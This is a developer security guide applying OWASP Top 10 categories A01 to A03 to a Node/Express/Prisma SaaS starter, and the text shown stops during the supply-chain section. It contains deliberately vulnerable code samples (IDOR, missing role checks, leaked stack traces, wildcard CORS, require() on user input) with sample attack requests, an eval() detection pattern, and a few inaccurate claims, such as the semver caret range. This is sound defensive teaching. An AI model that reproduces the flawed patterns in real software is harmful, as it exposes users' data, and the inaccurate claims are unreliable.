# OWASP Top 10 2025 Security Guidance

Comprehensive security guidance for the Plinth SaaS starter, tailored to the Node.js + Express + React + PostgreSQL + Prisma stack.

## Table of Contents

1. [A01: Broken Access Control](#a01-broken-access-control) (CRITICAL)
2. [A02: Security Misconfiguration](#a02-security-misconfiguration) (CRITICAL)
3. [A03: Software Supply Chain Failures](#a03-software-supply-chain-failures) (CRITICAL)
4. [A04: Cryptographic Failures](#a04-cryptographic-failures) (MODERATE)
5. [A05: Injection](#a05-injection) (MODERATE)
6. [A06: Insecure Design](#a06-insecure-design) (ADVISORY)
7. [A07: Authentication Failures](#a07-authentication-failures) (MODERATE)
8. [A08: Software and Data Integrity Failures](#a08-software-and-data-integrity-failures) (ADVISORY)
9. [A09: Security Logging and Alerting Failures](#a09-security-logging-and-alerting-failures) (ADVISORY)
10. [A10: Mishandling of Exceptional Conditions](#a10-mishandling-of-exceptional-conditions) (ADVISORY)

---

## A01: Broken Access Control

**Priority:** CRITICAL | **Enforcement:** BLOCK

**CWEs:** CWE-22 Path Traversal, CWE-284 Improper Access Control, CWE-285 Improper Authorization, CWE-639 Insecure Direct Object Reference (IDOR)

### Description

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing a business function outside the user's limits.

### Common Vulnerabilities

1. **Broken Multi-Tenant Isolation**
   - Organization A's users accessing Organization B's data
   - Trusting client-provided `organizationId` instead of server-derived value

2. **Horizontal Privilege Escalation**
   - User A accessing User B's resources within the same organization
   - Missing ownership validation on user-scoped resources

3. **Vertical Privilege Escalation**
   - Member performing admin operations
   - Admin demoting owner
   - Missing role enforcement

4. **Insecure Direct Object References (IDOR)**
   - Accessing resources by guessing/changing IDs
   - No validation that user has access to requested resource

5. **Missing Function Level Access Control**
   - Admin endpoints accessible to members
   - Missing authentication middleware

### Attack Scenarios

#### Scenario 1: Multi-Tenant Isolation Bypass

```typescript
// ❌ VULNERABLE - Trusts client-provided organizationId
app.get('/api/v1/data', async (req, res) => {
  const { organizationId } = req.query // Client controls this!

  const data = await prisma.sensitiveData.findMany({
    where: { organizationId },
  })

  res.json(data)
})

// Attack: GET /api/v1/data?organizationId=victim-org-id
// Result: Attacker accesses victim organization's data
```

#### Scenario 2: Horizontal Privilege Escalation

```typescript
// ❌ VULNERABLE - No ownership validation
app.get('/api/v1/users/:userId/settings', authenticate, async (req, res) => {
  const { userId } = req.params

  const settings = await prisma.userSettings.findUnique({
    where: { userId },
  })

  res.json(settings)
})

// Attack: GET /api/v1/users/other-user-id/settings
// Result: User A accesses User B's private settings
```

#### Scenario 3: Vertical Privilege Escalation

```typescript
// ❌ VULNERABLE - No role check
app.delete('/api/v1/orgs/:slug/members/:userId', authenticate, async (req, res) => {
  const { userId } = req.params
  const tenantId = req.tenantId!

  await prisma.membership.delete({
    where: {
      userId_organizationId: {
        userId,
        organizationId: tenantId,
      },
    },
  })

  res.status(204).send()
})

// Attack: Member user calls endpoint
// Result: Member removes admin/owner from organization
```

### Prevention Strategies

#### 1. Multi-Tenant Isolation Pattern

**CRITICAL:** Always derive `organizationId` from authenticated context, never from client input.

```typescript
// ✅ SECURE - Server-derived organizationId
import { authenticate } from '../middleware/auth'
import { requireRole } from '../middleware/rbac'

app.get(
  '/api/v1/orgs/:slug/data',
  authenticate, // Sets req.user, req.tenantId
  requireRole('MEMBER'), // Verifies membership, enforces role
  async (req, res) => {
    // req.tenantId is derived from JWT/API key, NOT from client
    const data = await prisma.sensitiveData.findMany({
      where: { organizationId: req.tenantId },
    })

    res.json(data)
  },
)
```

**Middleware Implementation:**

```typescript
// apps/api/src/middleware/rbac.ts
import { RequestHandler } from 'express'
import { Role } from '@prisma/client'
import { AppError } from '../lib/errors'
import { prisma } from '../lib/prisma'

const roleHierarchy: Record<Role, number> = {
  OWNER: 3,
  ADMIN: 2,
  MEMBER: 1,
}

export const requireRole = (minRole: Role): RequestHandler => {
  return async (req, res, next) => {
    try {
      const { user, params } = req

      if (!user) {
        throw new AppError('Unauthorized', 401, 'UNAUTHORIZED')
      }

      // Lookup organization by slug
      const org = await prisma.organization.findUnique({
        where: { slug: params.slug },
      })

      if (!org) {
        // Don't reveal if org exists to non-members
        throw new AppError('Organization not found', 404, 'ORG_NOT_FOUND')
      }

      // Get user's membership
      const membership = await prisma.membership.findUnique({
        where: {
          userId_organizationId: {
            userId: user.id,
            organizationId: org.id,
          },
        },
      })

      if (!membership) {
        throw new AppError('Forbidden', 403, 'NOT_ORG_MEMBER')
      }

      // Check role hierarchy
      if (roleHierarchy[membership.role] < roleHierarchy[minRole]) {
        throw new AppError('Insufficient permissions', 403, 'FORBIDDEN')
      }

      // Attach membership and tenantId to request
      req.membership = membership
      req.tenantId = org.id

      next()
    } catch (error) {
      next(error)
    }
  }
}
```

#### 2. Horizontal Privilege Escalation Prevention

**Pattern:** Always validate resource ownership for user-scoped resources.

```typescript
// ✅ SECURE - Validates ownership
app.get('/api/v1/users/:userId/settings', authenticate, async (req, res) => {
  const { userId } = req.params
  const requestingUserId = req.user!.id

  // CRITICAL: Verify ownership
  if (userId !== requestingUserId) {
    throw new AppError('Forbidden', 403, 'FORBIDDEN')
  }

  const settings = await prisma.userSettings.findUnique({
    where: { userId },
  })

  if (!settings) {
    throw new AppError('Settings not found', 404, 'SETTINGS_NOT_FOUND')
  }

  res.json(settings)
})

// OR: Query by authenticated user ID directly
app.get('/api/v1/me/settings', authenticate, async (req, res) => {
  const userId = req.user!.id

  const settings = await prisma.userSettings.findUnique({
    where: { userId }, // Always authenticated user's ID
  })

  if (!settings) {
    throw new AppError('Settings not found', 404, 'SETTINGS_NOT_FOUND')
  }

  res.json(settings)
})
```

#### 3. Vertical Privilege Escalation Prevention

**Pattern:** Use `requireRole()` middleware to enforce role requirements.

```typescript
// ✅ SECURE - Role-based access control
app.delete(
  '/api/v1/orgs/:slug/members/:userId',
  authenticate,
  requireRole('ADMIN'), // Must be ADMIN or OWNER
  async (req, res) => {
    const { userId } = req.params
    const tenantId = req.tenantId!
    const actorMembership = req.membership!

    // Get target membership
    const targetMembership = await prisma.membership.findUnique({
      where: {
        userId_organizationId: {
          userId,
          organizationId: tenantId,
        },
      },
    })

    if (!targetMembership) {
      throw new AppError('Member not found', 404, 'MEMBER_NOT_FOUND')
    }

    // CRITICAL: RBAC edge case protection

    // 1. Prevent removing owner (unless transferring first)
    if (targetMembership.role === 'OWNER') {
      throw new AppError('Cannot remove owner', 403, 'CANNOT_REMOVE_OWNER')
    }

    // 2. Prevent admin from removing other admins (only owner can)
    if (targetMembership.role === 'ADMIN' && actorMembership.role !== 'OWNER') {
      throw new AppError('Insufficient permissions', 403, 'FORBIDDEN')
    }

    // 3. Prevent self-removal as last owner
    if (userId === req.user!.id && actorMembership.role === 'OWNER') {
      const ownerCount = await prisma.membership.count({
        where: {
          organizationId: tenantId,
          role: 'OWNER',
        },
      })

      if (ownerCount === 1) {
        throw new AppError('Cannot remove last owner', 400, 'LAST_OWNER')
      }
    }

    // Delete membership
    await prisma.membership.delete({
      where: { id: targetMembership.id },
    })

    res.status(204).send()
  },
)
```

#### 4. IDOR Prevention

**Pattern:** Always filter by both resource ID and authenticated context.

```typescript
// ✅ SECURE - Validates both ID and ownership
app.get(
  '/api/v1/orgs/:slug/api-keys/:keyId',
  authenticate,
  requireRole('ADMIN'),
  async (req, res) => {
    const { keyId } = req.params
    const tenantId = req.tenantId!

    // CRITICAL: Filter by BOTH keyId AND organizationId
    const apiKey = await prisma.apiKey.findFirst({
      where: {
        id: keyId,
        organizationId: tenantId, // Prevents cross-tenant access
      },
    })

    if (!apiKey) {
      throw new AppError('API key not found', 404, 'API_KEY_NOT_FOUND')
    }

    res.json(apiKey)
  },
)
```

### 404 vs 403 Decision Matrix

Choosing the correct status code prevents information leakage:

```
Request Flow:
├─ Valid auth token? NO → 401 UNAUTHENTICATED
├─ Organization exists? NO → 404 ORG_NOT_FOUND (don't leak existence)
├─ User is org member? NO → 403 NOT_ORG_MEMBER
├─ Sufficient role? NO → 403 FORBIDDEN
├─ Resource exists in org? NO → 404 RESOURCE_NOT_FOUND
└─ Success → 200/201/204
```

**Rationale:**

- Use **404** when the user shouldn't know if the resource exists (prevents enumeration)
- Use **403** when the user knows the resource exists but lacks permission

```typescript
// Example implementation
app.get('/api/v1/orgs/:slug/members', authenticate, async (req, res) => {
  const { slug } = req.params
  const userId = req.user!.id

  // 1. Check if org exists
  const org = await prisma.organization.findUnique({ where: { slug } })
  if (!org) {
    // 404 - Don't reveal if org exists to non-members
    throw new AppError('Organization not found', 404, 'ORG_NOT_FOUND')
  }

  // 2. Check if user is member
  const membership = await prisma.membership.findUnique({
    where: {
      userId_organizationId: {
        userId,
        organizationId: org.id,
      },
    },
  })

  if (!membership) {
    // 403 - User knows org exists (found by slug), but not a member
    throw new AppError('Forbidden', 403, 'NOT_ORG_MEMBER')
  }

  // 3. Check role (if needed)
  if (roleHierarchy[membership.role] < roleHierarchy.MEMBER) {
    throw new AppError('Forbidden', 403, 'FORBIDDEN')
  }

  // 4. Fetch members (scoped to org)
  const members = await prisma.membership.findMany({
    where: { organizationId: org.id },
    include: { user: true },
  })

  res.json({ data: members })
})
```

### Testing Requirements

Every protected endpoint MUST have tests covering:

```typescript
describe('GET /api/v1/orgs/:slug/data', () => {
  // 1. Authentication
  it('returns 401 when not authenticated', async () => {
    await request(app).get('/api/v1/orgs/acme/data').expect(401)
  })

  // 2. Organization existence
  it('returns 404 when org does not exist', async () => {
    const user = await seedUser()
    const token = generateToken(user)

    await request(app)
      .get('/api/v1/orgs/nonexistent/data')
      .set('Authorization', `Bearer ${token}`)
      .expect(404)
  })

  // 3. Membership validation
  it('returns 403 when user is not org member', async () => {
    const user = await seedUser()
    const org = await seedOrg({ slug: 'acme' })
    const token = generateToken(user)

    await request(app)
      .get('/api/v1/orgs/acme/data')
      .set('Authorization', `Bearer ${token}`)
      .expect(403)
  })

  // 4. Role validation
  it('returns 403 when user has insufficient role', async () => {
    const user = await seedUser()
    const org = await seedOrg({ slug: 'acme' })
    await seedMembership({ userId: user.id, orgId: org.id, role: 'MEMBER' })
    const token = generateToken(user)

    // If endpoint requires ADMIN
    await request(app)
      .delete('/api/v1/orgs/acme/members/other-user')
      .set('Authorization', `Bearer ${token}`)
      .expect(403)
  })

  // 5. Cross-tenant access
  it('prevents cross-tenant access', async () => {
    const user = await seedUser()
    const orgA = await seedOrg({ slug: 'org-a' })
    const orgB = await seedOrg({ slug: 'org-b' })
    await seedMembership({ userId: user.id, orgId: orgA.id, role: 'ADMIN' })
    const token = generateToken(user)

    // Try to access org-b's data
    await request(app)
      .get('/api/v1/orgs/org-b/data')
      .set('Authorization', `Bearer ${token}`)
      .expect(403)
  })

  // 6. Horizontal privilege escalation
  it('prevents user A from accessing user B resources', async () => {
    const userA = await seedUser()
    const userB = await seedUser()
    const org = await seedOrg()
    await seedMembership({ userId: userA.id, orgId: org.id, role: 'MEMBER' })
    await seedMembership({ userId: userB.id, orgId: org.id, role: 'MEMBER' })
    const token = generateToken(userA)

    // Try to access userB's settings
    await request(app)
      .get(`/api/v1/users/${userB.id}/settings`)
      .set('Authorization', `Bearer ${token}`)
      .expect(403)
  })

  // 7. RBAC edge cases
  it('prevents admin from demoting owner', async () => {
    const admin = await seedUser()
    const owner = await seedUser()
    const org = await seedOrg()
    await seedMembership({ userId: admin.id, orgId: org.id, role: 'ADMIN' })
    await seedMembership({ userId: owner.id, orgId: org.id, role: 'OWNER' })
    const token = generateToken(admin)

    await request(app)
      .patch(`/api/v1/orgs/${org.slug}/members/${owner.id}`)
      .set('Authorization', `Bearer ${token}`)
      .send({ role: 'MEMBER' })
      .expect(403)
  })

  it('prevents removal of last owner', async () => {
    const owner = await seedUser()
    const org = await seedOrg()
    await seedMembership({ userId: owner.id, orgId: org.id, role: 'OWNER' })
    const token = generateToken(owner)

    await request(app)
      .delete(`/api/v1/orgs/${org.slug}/members/${owner.id}`)
      .set('Authorization', `Bearer ${token}`)
      .expect(400)
  })

  // 8. Success case
  it('returns 200 when authenticated with correct permissions', async () => {
    const user = await seedUser()
    const org = await seedOrg({ slug: 'acme' })
    await seedMembership({ userId: user.id, orgId: org.id, role: 'MEMBER' })
    const token = generateToken(user)

    const response = await request(app)
      .get('/api/v1/orgs/acme/data')
      .set('Authorization', `Bearer ${token}`)
      .expect(200)

    expect(response.body.data).toBeInstanceOf(Array)
  })
})
```

### Checklist

- [ ] `organizationId` ALWAYS sourced from `req.tenantId`, NEVER from client
- [ ] All routes use `authenticate` middleware
- [ ] Role requirements enforced with `requireRole()` middleware
- [ ] Prisma queries filter by `organizationId` for org-scoped resources
- [ ] User-scoped resources validate ownership (`userId === req.user.id`)
- [ ] 404 vs 403 pattern followed (don't leak org existence)
- [ ] RBAC edge cases handled (owner protection, last owner, etc.)
- [ ] Tests cover: 401, 404 (org), 403 (member), 403 (role), cross-tenant, horizontal escalation
- [ ] API keys set `req.tenantId` from key's organization

---

## A02: Security Misconfiguration

**Priority:** CRITICAL | **Enforcement:** BLOCK

**CWEs:** CWE-16 Configuration, CWE-611 XML External Entities (XXE), CWE-2XX Misconfiguration

### Description

Security misconfiguration includes missing security hardening, improperly configured permissions, default configurations, verbose error messages revealing sensitive information, and missing security headers.

### Common Vulnerabilities

1. **Missing Security Headers**
   - No Content-Security-Policy (CSP)
   - No Strict-Transport-Security (HSTS)
   - No X-Frame-Options (clickjacking)
   - Missing X-Content-Type-Options (MIME sniffing)

2. **Verbose Error Messages**
   - Stack traces exposed to clients
   - Database errors revealed
   - Internal paths/structure leaked

3. **Insecure Defaults**
   - Default credentials
   - Debug mode in production
   - Unnecessary features enabled

4. **Improper CORS Configuration**
   - Wildcard origins (`*`)
   - Reflected origins without validation
   - Credentials allowed with wildcard

5. **Hardcoded Secrets**
   - API keys in source code
   - Database credentials committed
   - JWT secrets not environment-specific

### Attack Scenarios

#### Scenario 1: Stack Trace Leakage

```typescript
// ❌ VULNERABLE - Exposes internal details
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // REVEALS INTERNAL STRUCTURE
    query: req.query, // MAY CONTAIN SENSITIVE DATA
  })
})

// Response reveals:
// - File paths: /home/app/src/controllers/user.ts
// - Database structure: "column users.password does not exist"
// - Library versions: node_modules/@prisma/...
```

#### Scenario 2: CORS Misconfiguration

```typescript
// ❌ VULNERABLE - Allows all origins with credentials
app.use(
  cors({
    origin: '*', // Any website can make requests
    credentials: true, // AND include cookies!
  }),
)

// Attack: Malicious site makes authenticated request
// Result: User's httpOnly cookies sent to attacker's domain
```

#### Scenario 3: Missing Security Headers

```typescript
// ❌ VULNERABLE - No security headers
app.get('/api/data', (req, res) => {
  res.json({ data: 'sensitive' })
})

// Response headers:
// (no CSP, HSTS, X-Frame-Options, etc.)
// Vulnerable to: XSS, clickjacking, MITM attacks
```

### Prevention Strategies

#### 1. Security Headers with Helmet

**Install:**

```bash
pnpm add helmet
```

**Implementation:**

```typescript
// apps/api/src/app.ts
import express from 'express'
import helmet from 'helmet'

const app = express()

// ✅ SECURE - Helmet configures security headers
app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"], // No inline scripts in production
        styleSrc: ["'self'"],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"], // No iframes
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'none'"], // Can't be embedded in iframe
        upgradeInsecureRequests: [], // Upgrade HTTP to HTTPS
      },
    },

    // Strict Transport Security (HSTS)
    hsts: {
      maxAge: 31536000, // 1 year in seconds
      includeSubDomains: true,
      preload: true,
    },

    // X-Frame-Options (clickjacking protection)
    frameguard: {
      action: 'deny', // DENY or SAMEORIGIN
    },

    // X-Content-Type-Options (MIME sniffing protection)
    noSniff: true,

    // X-XSS-Protection (legacy, but still useful)
    xssFilter: true,

    // Referrer-Policy
    referrerPolicy: {
      policy: 'no-referrer',
    },

    // Permissions-Policy (disable unnecessary features)
    permissionsPolicy: {
      features: {
        geolocation: ["'none'"],
        microphone: ["'none'"],
        camera: ["'none'"],
        payment: ["'none'"],
      },
    },
  }),
)

export { app }
```

**Environment-Specific Configuration:**

```typescript
// apps/api/src/config/security.ts
export const securityConfig = {
  development: {
    helmet: {
      contentSecurityPolicy: false, // Disable for hot reload
      hsts: false, // No HTTPS in development
    },
  },

  production: {
    helmet: {
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'"], // NO unsafe-inline in production
          styleSrc: ["'self'"],
          // ... strict policies
        },
      },
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true,
      },
    },
  },
}

// Usage
import { securityConfig } from './config/security'

const config =
  process.env.NODE_ENV === 'production' ? securityConfig.production : securityConfig.development

app.use(helmet(config.helmet))
```

#### 2. Secure Error Handling

```typescript
// apps/api/src/middleware/error-handler.ts
import { Request, Response, NextFunction } from 'express'
import { AppError } from '../lib/errors'
import { logger } from '../lib/logger'

export const errorHandler = (err: Error, req: Request, res: Response, next: NextFunction) => {
  // ✅ Log full error server-side (with context)
  logger.error('Request error', {
    error: {
      message: err.message,
      stack: err.stack,
      name: err.name,
    },
    request: {
      method: req.method,
      url: req.url,
      params: req.params,
      // DON'T log req.body (may contain passwords)
      // DON'T log req.headers.authorization (tokens)
    },
    user: req.user?.id,
    timestamp: new Date().toISOString(),
  })

  // ✅ Return sanitized error to client
  if (err instanceof AppError) {
    // Known error - safe to send details
    return res.status(err.statusCode).json({
      error: {
        code: err.code,
        message: err.message,
        details: err.details, // Only pre-approved details
      },
    })
  }

  // ❌ Unknown error - generic message
  res.status(500).json({
    error: {
      code: 'INTERNAL_ERROR',
      message: 'An unexpected error occurred',
      details: {},
      // NO stack, NO error.message, NO internals
    },
  })
}

// AppError class (known errors only)
export class AppError extends Error {
  constructor(
    message: string,
    public statusCode: number,
    public code: string,
    public details: Record<string, any> = {},
  ) {
    super(message)
    this.name = 'AppError'
  }
}
```

**Zod Validation Error Handling:**

```typescript
import { ZodError } from 'zod'

export const errorHandler = (err: Error, req: Request, res: Response, next: NextFunction) => {
  // ... logging ...

  // ✅ Zod validation errors (safe to expose)
  if (err instanceof ZodError) {
    return res.status(400).json({
      error: {
        code: 'VALIDATION_ERROR',
        message: 'Invalid request data',
        details: {
          fields: err.errors.map((e) => ({
            path: e.path.join('.'),
            message: e.message,
          })),
        },
      },
    })
  }

  // ... AppError handling ...
  // ... generic 500 handling ...
}
```

#### 3. CORS Configuration

```typescript
// apps/api/src/config/cors.ts
import cors from 'cors'

const allowedOrigins =
  process.env.NODE_ENV === 'production'
    ? [
        'https://app.example.com',
        'https://www.example.com',
        // Add production domains
      ]
    : [
        'http://localhost:5173', // Vite dev server
        'http://localhost:3000',
      ]

export const corsMiddleware = cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, Postman, etc.)
    if (!origin) {
      return callback(null, true)
    }

    if (allowedOrigins.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  },

  credentials: true, // Allow cookies

  // Expose headers to client
  exposedHeaders: ['X-Total-Count', 'X-Next-Cursor'],

  // Preflight cache duration
  maxAge: 86400, // 24 hours

  // Allowed methods
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

  // Allowed headers
  allowedHeaders: ['Content-Type', 'Authorization'],
})

// Usage
import { corsMiddleware } from './config/cors'
app.use(corsMiddleware)
```

#### 4. Environment Variables & Secrets Management

**❌ NEVER commit secrets:**

```typescript
// ❌ VULNERABLE - Hardcoded secret
const JWT_SECRET = 'my-super-secret-key'

// ❌ VULNERABLE - Committed in .env
// .env (committed to git)
JWT_SECRET=my-super-secret-key
```

**✅ Use environment variables:**

```bash
# .env (gitignored)
JWT_SECRET=randomly-generated-secret-key-here
JWT_REFRESH_SECRET=another-random-secret
DATABASE_URL=postgresql://user:pass@localhost:5432/db
BCRYPT_WORK_FACTOR=10
```

```bash
# .env.example (committed to git)
JWT_SECRET=
JWT_REFRESH_SECRET=
DATABASE_URL=
BCRYPT_WORK_FACTOR=10
```

**Validate environment variables at startup:**

```typescript
// apps/api/src/config/env.ts
import { z } from 'zod'

const EnvSchema = z.object({
  NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
  PORT: z.string().transform(Number).pipe(z.number().min(1).max(65535)).default('3000'),

  DATABASE_URL: z.string().url(),

  JWT_SECRET: z.string().min(32),
  JWT_REFRESH_SECRET: z.string().min(32),
  JWT_ACCESS_EXPIRY: z.string().default('15m'),
  JWT_REFRESH_EXPIRY: z.string().default('7d'),

  BCRYPT_WORK_FACTOR: z.string().transform(Number).pipe(z.number().min(10).max(15)).default('10'),

  SMTP_HOST: z.string().optional(),
  SMTP_PORT: z.string().transform(Number).optional(),
  SMTP_USER: z.string().optional(),
  SMTP_PASS: z.string().optional(),

  APP_URL: z.string().url(),
  API_URL: z.string().url(),
})

export type Env = z.infer<typeof EnvSchema>

export const env = EnvSchema.parse(process.env)

// Usage
import { env } from './config/env'
const token = jwt.sign({ userId }, env.JWT_SECRET)
```

**Fail fast on missing variables:**

```typescript
// apps/api/src/index.ts
import { env } from './config/env' // Validates at import

// If validation fails, app crashes with clear error:
// Error: Invalid environment variables:
//   - JWT_SECRET: Required
//   - DATABASE_URL: Required
```

#### 5. HTTPS Enforcement

```typescript
// apps/api/src/middleware/https-redirect.ts
import { Request, Response, NextFunction } from 'express'

export const httpsRedirect = (req: Request, res: Response, next: NextFunction) => {
  if (process.env.NODE_ENV === 'production') {
    const proto = req.headers['x-forwarded-proto'] || req.protocol

    if (proto !== 'https') {
      return res.redirect(301, `https://${req.headers.host}${req.url}`)
    }
  }

  next()
}

// Usage
app.use(httpsRedirect)
```

**Secure Cookies:**

```typescript
const cookieOptions = {
  httpOnly: true, // Not accessible to JavaScript
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: 'strict' as const, // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/api/v1/auth/refresh', // Limit scope
}

res.cookie('refreshToken', refreshToken, cookieOptions)
```

### Frontend Security (React)

**Content Security Policy for Vite:**

```html
<!-- apps/web/index.html -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- CSP meta tag (backup if server headers fail) -->
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' http://localhost:3000; frame-ancestors 'none';"
    />

    <title>Plinth</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

**Subresource Integrity (SRI) for CDN assets:**

```html
<!-- ✅ SECURE - SRI hash verification -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

<!-- ❌ VULNERABLE - No integrity check -->
<script src="https://cdn.example.com/library.js"></script>
```

### Checklist

- [ ] Helmet middleware configured with CSP, HSTS, X-Frame-Options, etc.
- [ ] Error handler NEVER exposes stack traces, DB errors, or internal paths
- [ ] CORS restricted to known origins (not wildcard `*`)
- [ ] All secrets in environment variables, NEVER committed
- [ ] `.env` gitignored, `.env.example` committed
- [ ] Environment variables validated at startup (Zod)
- [ ] HTTPS enforced in production (redirect HTTP → HTTPS)
- [ ] Cookies: `httpOnly`, `secure` (production), `sameSite: strict`
- [ ] CSP configured (no `unsafe-inline` in production)
- [ ] CDN assets use SRI hashes (if applicable)
- [ ] Default credentials disabled/removed
- [ ] Debug mode disabled in production

---

## A03: Software Supply Chain Failures

**Priority:** CRITICAL | **Enforcement:** WARN (block on high/critical CVEs)

**CWEs:** CWE-1329 Supply Chain, CWE-829 Inclusion of Functionality from Untrusted Control Sphere

### Description

Software supply chain attacks occur when an application includes vulnerable, malicious, or compromised components. This includes dependencies, build tools, CI/CD pipelines, and third-party integrations.

### Common Vulnerabilities

1. **Vulnerable Dependencies**
   - Using packages with known CVEs
   - Outdated dependencies
   - No automated vulnerability scanning

2. **Malicious Packages**
   - Typosquatting (lodash vs loadash)
   - Compromised maintainer accounts
   - Dependency confusion attacks

3. **Insecure CI/CD**
   - Secrets in build logs
   - Untrusted code execution
   - No artifact signing

4. **Lack of Integrity Verification**
   - No lock file committed
   - No SRI for CDN assets
   - No signature verification

### Attack Scenarios

#### Scenario 1: Vulnerable Dependency

```json
// package.json
{
  "dependencies": {
    "axios": "0.21.0" // Has CVE-2021-3749 (Server-Side Request Forgery)
  }
}

// Attack: Exploiting known vulnerability in outdated package
// Result: SSRF allows attacker to access internal services
```

#### Scenario 2: Malicious Package (Typosquatting)

```bash
# Developer typo
npm install loadash  # Should be 'lodash'

# Malicious package 'loadash' installed
# Exfiltrates environment variables on postinstall
```

#### Scenario 3: eval() with Untrusted Code

```typescript
// ❌ VULNERABLE - Executing arbitrary code
const userModule = require(req.body.moduleName)
userModule.run()

// Attack: req.body.moduleName = "../../../../etc/passwd"
// Result: Arbitrary code execution
```

### Prevention Strategies

#### 1. Dependency Auditing

**pnpm audit (built-in):**

```bash
# Check for vulnerabilities
pnpm audit

# Auto-fix (updates to safe versions)
pnpm audit --fix

# Fail CI on high/critical vulnerabilities
pnpm audit --audit-level=high
```

**GitHub Dependabot:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    open-pull-requests-limit: 10
    reviewers:
      - 'your-username'
    labels:
      - 'dependencies'
      - 'security'
```

**CI Integration:**

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: pnpm/action-setup@v2
        with:
          version: 8

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      - name: Audit dependencies
        run: pnpm audit --audit-level=moderate

      - name: Check for outdated deps
        run: pnpm outdated || true
```

#### 2. Lock Files & Deterministic Builds

**✅ Always commit lock file:**

```bash
# pnpm-lock.yaml
# This file ensures deterministic installs across environments
# MUST be committed to version control

# .gitignore
node_modules/
# DO NOT ignore pnpm-lock.yaml
```

**Frozen lockfile in CI:**

```yaml
# .github/workflows/ci.yml
- name: Install dependencies
  run: pnpm install --frozen-lockfile # Fail if lock file is out of sync
```

#### 3. Dependency Pinning (Critical Packages)

```json
// package.json
{
  "dependencies": {
    // ✅ Pinned (no caret/tilde for critical security deps)
    "bcrypt": "5.1.0",
    "jsonwebtoken": "9.0.0",

    // ⚠️ Flexible (allow patch updates for general deps)
    "express": "^4.18.0", // Allows 4.18.x
    "zod": "~3.22.0" // Allows 3.22.x
  }
}
```

**Rationale:**

- **Pinned:** Critical security packages (crypto, auth) to avoid surprise breaking changes
- **Flexible:** General packages to receive security patches automatically

#### 4. Prohibit Dangerous Patterns

**❌ NEVER use eval() or Function():**

```typescript
// ❌ VULNERABLE
eval(userInput) // Arbitrary code execution
new Function(userInput)() // Arbitrary code execution
require(userInput) // Arbitrary module loading

// ✅ SAFE - Use JSON.parse for data
const data = JSON.parse(userInput)

// ✅ SAFE - Static imports only
import { safeFunction } from 'trusted-package'
```

**Security-check hook catches these:**

```bash
# .claude/hooks/security-check.sh
EVAL_USAGE=$(echo "$STAGED_FILES" | xargs grep -nH '\beval\s*(\|new\s\+Function\s*(' 2>/dev/null || true)
if [ -n "$EVAL_USAGE" ]; then
  echo "❌ CRITICAL: eval() or Function() constructor detected"
  exit 1
fi
```

#### 5. Subresource Integrity (SRI)

**For CDN assets in frontend:**

```html
<!-- ✅ SECURE - Integrity verification -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha384-xxx"
  crossorigin="anonymous"
></script>

<!-- Generate SRI hash: -->
<!-- curl -s https://cdn.../library.js | openssl dgst -sha384 -binary | openssl base64 -A -->
```

#### 6. Secure npm/pnpm Configuration

```bash
# .npmrc (project-level)
# Prevent automatic execution of install scripts
ignore-scripts=true

# Only install exact versions from lock file
package-lock=true

# Audit on install
audit=true
audit-level=moderate

# Use registry with 2FA
registry=https://registry.npmjs.org/
```

**For packages that need install scripts (e.g., bcrypt, sharp):**

```json
// package.json
{
  "scripts": {
    "prepare": "node scripts/verify-deps.js && pnpm rebuild bcrypt"
  }
}
```

#### 7. Dependency Update Policy

| Severity | Action                              | Timeline     |
| -------- | ----------------------------------- | ------------ |
| Critical | Patch immediately, emergency deploy | 24 hours     |
| High     | Patch in next release               | 1 week       |
| Moderate | Patch in next scheduled update      | 1 month      |
| Low      | Patch when convenient               | Next quarter |

**Update Process:**

```bash
# 1. Check for updates
pnpm outdated

# 2. Update to latest safe versions
pnpm update

# 3. Test thoroughly
pnpm test
pnpm typecheck
pnpm build

# 4. Commit lock file
git add pnpm-lock.yaml package.json
git commit -m "chore(deps): update dependencies"
```

#### 8. Verify Package Integrity

**Before adding a new dependency:**

```bash
# 1. Check package reputation
npm info <package-name>

# 2. Verify maintainer
# - Check npm profile
# - Verify GitHub repo exists
# - Check download count (popular = safer)

# 3. Review source code
# - Check for suspicious postinstall scripts
# - Scan for obfuscated code
# - Verify license

# 4. Check for typosquatting
# - Correct spelling?
# - Similar-named packages?

# 5. Add to project
